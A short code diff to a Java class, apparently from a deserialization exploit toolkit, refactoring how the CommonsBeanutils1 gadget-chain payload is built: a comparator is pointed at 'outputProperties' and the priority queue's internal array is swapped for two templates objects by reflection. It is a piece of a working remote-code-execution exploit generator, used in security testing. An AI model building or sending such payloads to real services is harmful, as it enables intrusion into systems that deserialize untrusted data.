@@ -26,13 +26,8 @@ public class CommonsBeanutils1 implements ObjectPayload<Object> {
 		queue.add(new BigInteger("1"));
 		queue.add(new BigInteger("1"));
 
-		// switch method called by comparator
 		Reflections.setFieldValue(comparator, "property", "outputProperties");
-
-		// switch contents of queue
-		final Object[] queueArray = (Object[]) Reflections.getFieldValue(queue, "queue");
-		queueArray[0] = templates;
-		queueArray[1] = templates;
+		Reflections.setFieldValue(queue, "queue", new Object[]{templates, templates});
 
 		return queue;
 	}
